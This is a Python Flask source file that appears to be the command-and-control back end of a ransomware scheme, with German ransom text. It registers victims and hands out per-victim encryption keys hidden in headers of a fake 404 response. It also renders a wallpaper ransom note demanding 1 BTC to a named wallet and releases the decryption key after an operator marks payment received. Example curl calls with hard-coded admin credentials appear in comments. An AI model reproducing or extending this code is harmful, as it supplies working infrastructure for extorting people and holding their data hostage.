from flask import render_template, url_for, flash, redirect, request, make_response
from PIL import Image, ImageDraw, ImageFont
from app import app, db, auth, verify_password
from werkzeug.security import check_password_hash
from app.models import Victim, load_victim
import random, os
import base64

# Automatically creates a image file with the specified ransom note
# The image will be saved in a publicly available manner, so that an
# infected PC can pull it and set is as PC wallpaper
def create_custom_wallpaper(id, username, ip):
    img = Image.new("RGB", (1920, 1080))
    font = ImageFont.truetype("./app/static/agency.ttf", 37)
    text = f"Hallo {username},\n\nDein PC wurde nun von einer Ransomware befallen. Deine entsprechenden Daten wurden verschlüsselt und sind nicht mehr aufrufbar.\nUm wieder Zugriff zu erhalten musst Du 1 BTC (~25000 €) an folgendes BTC Wallet überweisen : bc1qtt04zfgjxg7lpqhk9vk8hnmnwf88ucwww5arsd\nNach Eingang der Zahlung werden Deine Daten wieder entschlüsselt.\n\nDeine IP zum Infektionszeitpunkt war die: {ip}\n\nBitte starte nach der Zahlung erneut die Blocky.exe und lasse die Software laufen, damit der Entschlüsselungsprozess stattfinden kann.\n\nVielen Dank.\nMit freundlichen Grüßen\n\nGerman Hacker"

    d = ImageDraw.Draw(img)
    d.text((10, 10), text, font=font, fill=(255, 0, 0))
    img.save(f"./app/static/wp/{id}.png")


# Show an overview of all victims currently registered in the database
@app.route("/", methods=["GET"])
@app.route("/overview", methods=["GET"])
@auth.login_required
def displayIndex():
    victims = Victim.query.filter_by(archived=0).all()
    return render_template(
        "overview.html",
        title="Übersicht Ransomware Opfer",
        victims=victims,
        user=auth.current_user(),
        count=len(victims),
    )


# Show archived victims in an overview table
@app.route("/archive")
@auth.login_required
def displayArchive():
    victims = Victim.query.filter_by(archived=1).order_by(Victim.victim_id.desc()).all()
    return render_template("archive.html", title="Archiv", victims=victims)


# When called, creates an Victim object in the DB and responds with a fake 404,
# with HTTP headers containing Encryption ID & Key
# ex: curl -i -X POST -F 'victim_hostname=RandomInfectedPC' -F 'victim_username=someUser' -F 'ip=192.168.178.3' http://127.1:5000/create
@app.route("/create", methods=["POST"])
def createVictim():
    error = None
    if request.method == "POST":
        # if request.accesskey == "accesskey":
        victim_id = random.randint(0, 999999999999)
        victim_key = base64.b64encode(os.urandom(32)).decode("ascii")
        victim = Victim(
            victim_id=victim_id,
            victim_username=request.form["username"],
            victim_hostname=request.form["hostname"],
            victim_key=victim_key,
            ip_firstContact=request.form["ip"],
        )
        db.session.add(victim)
        db.session.commit()
        create_custom_wallpaper(
            str(victim_id), request.form["username"], request.form["ip"]
        )
        response = make_response(render_template("404.html"), 404)
        response.headers["Victim-Id"] = str(victim_id)
        response.headers["Victim-Key"] = victim_key
        return response


# Checks if payment has been received by the specific victim ID.
# If so, return Decryption key to enable decryption on the client
# ex: curl -i -X POST http://127.1:5000/check/36821736128
@app.route("/check/<int:victim_id>", methods=["POST"])
def checkStatus(victim_id):
    victim = Victim.query.get(victim_id)
    response = make_response(render_template("404.html"), 404)
    response.headers["Payment-Received"] = str(victim.payment_received)
    if victim.payment_received:
        response.headers["Victim-Key"] = victim.victim_key
    return response


# When called, the specific victim has payed it's ransom and can be set as so in the DB
# ex: curl -i -X POST http://rnsm-admin:rnsm@localhost:5000/paymentReceived/261153847923
@app.route("/paymentReceived/<int:victim_id>", methods=["GET"])
@auth.login_required
def receivePayment(victim_id):
    victim = Victim.query.get(victim_id)
    victim.payment_received = True
    victim.archived = True
    db.session.commit()
    os.remove(f"./app/static/wp/{victim_id}.png")
    return redirect(url_for("displayIndex"))
